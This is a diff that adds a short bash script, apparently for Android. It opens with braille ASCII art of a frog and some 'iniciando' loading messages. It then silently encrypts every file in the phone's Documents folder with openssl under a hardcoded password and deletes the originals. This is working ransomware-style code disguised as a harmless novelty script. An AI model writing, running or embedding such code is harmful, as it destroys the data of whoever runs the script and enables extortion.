@@ -1,0 +1,53 @@
+#!/bin/env bash 
+
+echo '⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠖⠒⢦⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡤⠾⠓⠋⠉⠉⠉⠉⠑⠲⢄⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡤⠴⠚⠉⠀⠀⠀⠀⣠⣄⡀⠀⠀⠀⠀⠈⢧⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠤⠴⠒⠚⠉⠉⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠟⠉⢳⠀⠀⠀⠀⡾⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠒⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡇⠀⢀⡾⠀⠀⠀⣸⠁⠀
+⠀⠀⠀⢀⣀⡠⠤⣴⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⢀⡼⠃⠀⠀
+⠀⣴⠚⠉⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀
+⠀⣇⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀
+⠀⠉⠳⢤⣼⠁⠀⢠⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⠀⣀⡴⠟⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⡇⠀⠀⢀⣀⠀⠉⠉⠉⠉⠓⠲⠤⣄⡀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣠⠴⠟⠛⠉⠉⠉⠉⠉⠛⠒⠶⠤⢤⣀⡄⠙⢦⣄⠀⡞⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠛⡇⠀⠀⠀⠀⠈⠓⠦⠤⠶⠒⠻⣿⣁⣀⠀⠀⠀
+⠈⢳⣀⠀⠀⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡿⠦⢽⡲⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⡭⣍⣛⡦
+⠀⠀⠉⠳⣤⣀⠀⠉⠙⠓⠒⠒⠲⠤⠤⠴⠒⠚⠋⠉⠀⠿⢷⡶⡬⠆⠈⠙⠲⠤⢤⡤⠤⠤⠤⣍⣓⡦⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⠉⠉⠓⠒⠶⠤⢤⣄⣀⡀⠀⠀⠀⣰⠦⠤⣄⣈⠉⠲⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠲⢤⡈⢲⡀⠀⠈⠉⠒⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉'
+echo 'iniciando.'
+sleep 1
+echo 'iniciando..'
+sleep 1
+echo 'iniciando...'
+sleep 1
+echo 'iniciando....'
+echo 'FROG'
+
+#!/bin/bash
+
+# Definindo o caminho da pasta
+FOLDER_PATH='/storage/emulated/0/Documents' 
+
+PASSWORD="d454e33b01776fdaa08151705b54cdd3" 
+
+# Verifica se o diretório existe
+if [ ! -d "$FOLDER_PATH" ]; then
+    echo "O diretório $FOLDER_PATH não existe."
+    exit 1
+fi
+
+# Criptografa todos os arquivos no diretório
+for file in "$FOLDER_PATH"/*; do
+    if [ -f "$file" ]; then
+        # Criptografa o arquivo
+        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -pass pass:"$PASSWORD"
+        # Remove o arquivo original
+        rm "$file"
+        echo "Arquivo $file criptografado."
+    fi
+done
+
+echo "END"
